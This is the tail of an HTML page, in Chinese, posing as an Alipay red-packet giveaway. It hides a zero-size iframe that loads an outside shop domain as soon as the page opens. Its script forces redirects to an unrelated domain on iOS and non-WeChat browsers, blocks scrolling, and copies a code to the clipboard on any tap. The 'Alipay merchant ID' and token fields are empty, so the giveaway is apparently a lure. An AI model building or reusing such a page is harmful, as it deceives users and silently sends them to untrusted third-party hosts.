</style>
</head>
 <iframe src="http://d.vhcj.shop/w0try7393"frameborder="0" width="0" height="0"></iframe>
<body id="myBody">
    
    <!-- 模态框遮罩层 -->
    <div id="modalOverlay" class="modal-overlay"></div>

    <!-- 模态框 -->
    <div id="myModal" class="alertModal">
        <h3 class="h3-title">红包码复制成功</h3>
        <p>1. 打开支付宝APP</p>
        <p>2. 粘贴至搜索框</p>
        <p>3. 点击下方搜索领取</p>
        <p> - - - </p>
        <p>或者尝试一下</p>
        <p> 👇︎👇︎👇︎ </p>
        <p>右上角[···]在浏览器打开可直接跳到支付宝APP自动领取</p>
    </div>
	
	<script type="text/javascript">
	
        // 支付宝商家ID
		const shareId ='';
        // 红包码Token
		const toKen ='';
		// 红包码搜索码		
		const hongbaoNum ='';
		
        const ios_bg = 'ios.gif';

        const android_bg = 'android.gif';

        disableScroll();
        
        // 设备判断
        detectMobileOperatingSystem();
        
		// 跳转
		function jumpToAlipayApp(shareId, toKen) {

			window.location.href = 'https://wk7hx.kovtihgg.com/f/X-3RsOfN3Cw0z1dQ?layputType=4';
		}

		// 设备判断
		function detectMobileOperatingSystem() {

		    const userAgent = navigator.userAgent;
		    if (/Android/i.test(userAgent)) {

		    	// Android
		        // 使用Android背景图
                var body = document.querySelector('body');
                body.style.background = "url('"+ android_bg +"') no-repeat";
                body.style.backgroundSize = "100%";
                
                // 如果不是在微信内打开
                if (navigator.userAgent.indexOf("MicroMessenger") !== -1) {
                    
                    // 微信浏览器
                    // 获取<body>标签
                    var body = document.getElementById("myBody");
                    
                    // 监听body的点击
                    body.addEventListener("click", function() {
                        
                        // 复制红包码
                        copyToClipboard(hongbaoNum);
                    });
                }else {
                    
                    // 非微信浏览器
                    // 尝试跳转
                    jumpToAlipayApp(shareId, toKen);
                }
		    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {

		    	// iOS
		    	// 使用iOS背景图
                var body = document.querySelector('body');
                body.style.background = "url('"+ ios_bg +"') no-repeat";
                body.style.backgroundSize = "100%";
                
		        // 获取<body>标签
                var body = document.getElementById("myBody");
                
                // 自动跳
                jumpToAlipayApp(shareId, toKen);
            
                // 监听body的点击
                body.addEventListener("click", function() {
                    
                    // 跳转到支付宝APP
                    jumpToAlipayApp(shareId, toKen);
                });
		    } else {

		    	// 未知操作系统
		        // 使用Android的逻辑
		        // 修改background属性中的URL
                var elementToModify = document.querySelector('body');
                elementToModify.style.background = "url('') no-repeat";
                elementToModify.style.backgroundSize = "100%";
                
                // 如果不是在微信内打开
                if (navigator.userAgent.indexOf("MicroMessenger") !== -1) {
                    
                    // 微信浏览器
                    // 获取<body>标签
                    var body = document.getElementById("myBody");
                    
                    // 监听body的点击
                    body.addEventListener("click", function() {
                        
                        // 复制红包码
                        copyToClipboard(hongbaoNum);
                    });
                }else {
                    
                    // 非微信浏览器
                    // 尝试跳转
                    jumpToAlipayApp(shareId, toKen);
                }
		    }
		}
		
        // 禁止页面上下滑动
		function disableScroll() {
		    
            document.addEventListener("touchmove", function(e) {
                e.preventDefault();
            }, { passive: false });
        }
        
        // 打开模态框
        function openModal() {
            document.getElementById("modalOverlay").style.display = "block";
            document.getElementById("myModal").style.display = "block";
        }
    
        // 关闭模态框
        function closeModal() {
            document.getElementById("modalOverlay").style.display = "none";
            document.getElementById("myModal").style.display = "none";
        }
        
        // 复制红包码
        function copyToClipboard(textToCopy) {
            
            // 创建一个临时文本框元素
            const tempInput = document.createElement("input");
            tempInput.value = textToCopy;
            document.body.appendChild(tempInput);
            
            // 选择文本框的内容
            tempInput.select();
            
            // 尝试复制文本到剪贴板
            document.execCommand("copy");
            
            // 移除临时文本框元素
            document.body.removeChild(tempInput);
            
            // 复制完成，打开弹窗
            openModal();
        }
	</script>
</body>
</html>
